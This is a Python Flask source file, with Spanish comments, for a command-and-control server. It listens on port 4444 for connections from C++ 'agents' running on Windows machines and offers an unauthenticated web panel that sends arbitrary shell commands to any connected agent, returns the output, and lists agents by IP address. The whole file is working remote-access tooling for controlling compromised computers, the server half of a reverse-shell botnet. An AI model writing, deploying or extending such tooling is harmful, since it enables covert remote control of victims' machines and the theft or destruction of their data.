from flask import Flask, render_template, request, jsonify
import socket
import threading

app = Flask(__name__)

# --- MEMORIA COMPARTIDA ---
# Diccionario para guardar a los agentes: { id: {"socket": s, "addr": a, "res": "..."} }
agentes = {}

# --- HILO DE RED (Escucha conexiones de los agentes C++) ---
def escuchar_agentes():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(10)
    print("[*] Hilo de red activo: Esperando agentes en el puerto 4444...")
    while True:
        try:
            conn, addr = server.accept()
            id_agente = len(agentes)
            agentes[id_agente] = {
                "socket": conn, 
                "addr": addr, 
                "res": "Esperando comandos..."
            }
            print(f"[+] ¡NUEVO AGENTE! ID: {id_agente} desde {addr[0]}")
        except Exception as e:
            print(f"[-] Error en el hilo de red: {e}")

# --- RUTAS DE LA INTERFAZ WEB ---

@app.route('/')
def index():
    """ Renderiza la página principal del panel """
    return render_template('index.html')

@app.route('/ejecutar', methods=['POST'])
def ejecutar():
    """ Recibe comandos desde la web y los envía al agente C++ """
    try:
        id_target = int(request.form.get('id'))
        comando = request.form.get('comando')
        
        if id_target in agentes:
            conn = agentes[id_target]["socket"]
            conn.send(comando.encode())
            
            # Recibimos la respuesta (usando cp850 para los acentos de Windows)
            respuesta = conn.recv(4096).decode('cp850', errors='replace')
            agentes[id_target]["res"] = respuesta
            return jsonify({"status": "success", "resultado": respuesta})
        else:
            return jsonify({"status": "error", "resultado": "Agente no encontrado"})
    except Exception as e:
        return jsonify({"status": "error", "resultado": f"Error de conexión: {str(e)}"})

@app.route('/api/agentes')
def api_agentes():
    """ Devuelve la lista de agentes en formato JSON para el AJAX de la web """
    datos = []
    for id_agente, info in agentes.items():
        datos.append({
            "id": id_agente,
            "ip": info["addr"][0],
            "resultado": info["res"]
        })
    return jsonify(datos)

# --- BLOQUE DE ARRANQUE ---
if __name__ == '__main__':
    # 1. Lanzamos el hilo de red en segundo plano
    t = threading.Thread(target=escuchar_agentes, daemon=True)
    t.start()
    
    # 2. Arrancamos el servidor web (Host 0.0.0.0 para que sea accesible)
    print("[*] Iniciando Panel Web en http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
